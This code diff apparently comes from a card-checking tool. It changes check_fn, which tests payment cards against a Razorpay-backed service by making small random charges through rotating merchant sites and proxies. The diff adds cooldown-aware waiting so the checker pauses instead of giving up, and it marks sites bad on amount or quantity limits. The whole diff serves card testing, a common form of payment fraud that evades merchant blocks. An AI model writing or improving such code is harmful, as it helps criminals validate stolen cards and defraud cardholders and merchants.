@@ -242,6 +242,29 @@ def _rz_extra_lines():
     ]
 
 
+def _earliest_site_cooldown():
+    now = time.time()
+    earliest = None
+    with _site_guard:
+        for until in _site_dead_until.values():
+            if until > now and (earliest is None or until < earliest):
+                earliest = until
+        for until in _site_paused_until.values():
+            if until > now and (earliest is None or until < earliest):
+                earliest = until
+    return earliest
+
+
+def _earliest_proxy_cooldown():
+    now = time.time()
+    earliest = None
+    with _proxy_uses_guard:
+        for until in _proxy_paused_until.values():
+            if until > now and (earliest is None or until < earliest):
+                earliest = until
+    return earliest
+
+
 def check_fn(card):
     """Sync single-card check against the Razorpay API (VPS:9000).
 
@@ -250,22 +273,22 @@ def check_fn(card):
     run always produces real results, never "rz_site.txt empty" spam.
     Returns (status, msg, brand, amount_inr) — amount_inr is the actual charge."""
     server_error_sites = set()
-    waited = 0
-    for _attempt in range(8):
+    while True:
         site = _next_site()
         if not site:
-            if waited < 30:
-                time.sleep(3)
-                waited += 3
+            # all sites in cooldown -> PAUSE until the earliest one recovers
+            earliest = _earliest_site_cooldown()
+            if earliest and earliest > time.time():
+                time.sleep(min(earliest - time.time(), 300) + 0.5)
                 continue
-            return "ERROR", "All sites cooling — retry later", "UNKNOWN", 0
+            return "ERROR", "All sites unavailable (amount/blocked) — try later", "UNKNOWN", 0
         proxy, lock = _acquire_free_proxy()
         if proxy is None:
-            if waited < 30:
-                time.sleep(3)
-                waited += 3
+            earliest = _earliest_proxy_cooldown()
+            if earliest and earliest > time.time():
+                time.sleep(min(earliest - time.time(), 300) + 0.5)
                 continue
-            return "ERROR", "All proxies cooling — retry later", "UNKNOWN", 0
+            return "ERROR", "All proxies unavailable — try later", "UNKNOWN", 0
         try:
             amount = _amount_override or random.randint(23, 100) * 100  # ₹23-100 whole rupees
             q = urllib.parse.urlencode({
@@ -294,8 +317,9 @@ def check_fn(card):
                     _proxy_uses[proxy] = 0
                 continue
 
-            # site amount constraint / international-only -> mark site bad, retry
+            # site amount/quantity constraint / international-only -> mark site bad, retry
             if ("amount too small" in m or "amount exceeds maximum" in m or actual_paise > 10000
+                    or "quantity" in m or "min purchase" in m
                     or ("international" in m and ("not support" in m or "not allowed" in m))):
                 _bad_sites.add(_site_key(site))
                 continue
